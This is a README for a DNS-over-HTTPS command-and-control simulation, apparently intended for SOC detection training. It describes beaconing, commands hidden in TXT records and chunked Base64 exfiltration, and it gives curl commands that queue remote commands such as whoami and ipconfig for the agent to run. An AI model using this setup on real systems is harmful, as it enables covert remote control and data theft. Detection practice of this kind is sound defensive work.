# DoH C2-like Test Framework (DNS-over-HTTPS Command & Control Simulation)

This repository contains a fully controlled, safe, and lab-only DNS-over-HTTPS (DoH) tunneling simulation.  
It is designed exclusively for SOC detection exercises, allowing Blue Team members to identify DoH-based C2 patterns, DNS tunneling, chunked exfiltration, and TXT-based command delivery.

> ⚠️ Warning  
> This project is for internal lab use only.  
> Do NOT deploy on the Internet, on production infrastructure, or any unauthorized systems.

---

## 📌 Features

### ✔ DoH-based beaconing
Agent periodically sends A-record queries such as:
beacon.<session>.<domain>

### ✔ TXT record C2 commands
Server returns Base64-encoded commands via DNS TXT answers.

### ✔ Chunked output exfiltration
Command output is:
- Base64 encoded  
- Split into 40-byte chunks  
- Exfiltrated through DoH queries  
- Automatically rebuilt on the server  

### ✔ Automatic output reassembly
When all chunks are received:
- They are merged and decoded  
- Saved under:
  results/<session>/<timestamp>_<command_id>.txt
- Chunk memory is cleared

### ✔ Multiple queued commands
Server supports multiple queued commands per session via REST API.

---

## 📁 Project Structure
├── doh_agent.py # DoH Agent (client)
├── flask_doh_server.py # DoH server + command queue
├── results/ # Auto-created, stores reconstructed outputs
└── README.md

---

## 🚀 Usage

### 1️⃣ Start the DoH server

python flask_doh_server.py --host 0.0.0.0 --port 443
Server will listen on:
https://<server-ip>:443/dns-query

### 2️⃣ Run the agent
Example:
python doh_agent.py \
  --doh https://192.168.72.199:8443/dns-query \
  --domain test.local \
  --session cmpjgd \
  --min-interval 5 \
  --max-interval 7

### 3️⃣ Send commands
You can push commands using curl:
curl -k -X POST https://<server-ip>:8443/commands \
  -H "Content-Type: application/json" \
  -d '{"session":"cmpjgd","command":"whoami"}'

More examples:
curl -k -X POST https://<server-ip>:8443/commands \
  -H "Content-Type: application/json" \
  -d '{"session":"cmpjgd","command":"dir"}'

curl -k -X POST https://<server-ip>:8443/commands \
  -H "Content-Type: application/json" \
  -d '{"session":"cmpjgd","command":"ipconfig /all"}'

## 📦 Output Storage
Outputs are written to:
results/<session>/<timestamp>_<cmd_index>.txt

Example:
results/cmpjgd/2025-11-17_091706_cmd1.txt

## 📊 SOC Detection Use-Cases

This simulated C2 framework is ideal for testing detection of:
DoH-based beaconing
TXT-based remote command execution
DNS tunneling over DoH
Base64 payloads in subdomains
High-entropy DNS traffic
Chunked exfiltration patterns
DoH traffic to non-standard endpoints

Useful for:
SOC training
Threat hunting practice
Detection engineering validation
Blue Team exercises
Red/Blue joint simulations

## 🔐 Disclaimer

This project is intended only for isolated, controlled lab environments.
Unauthorized use outside training networks is prohibited.
Ensure compliance with all organizational policies and applicable laws.
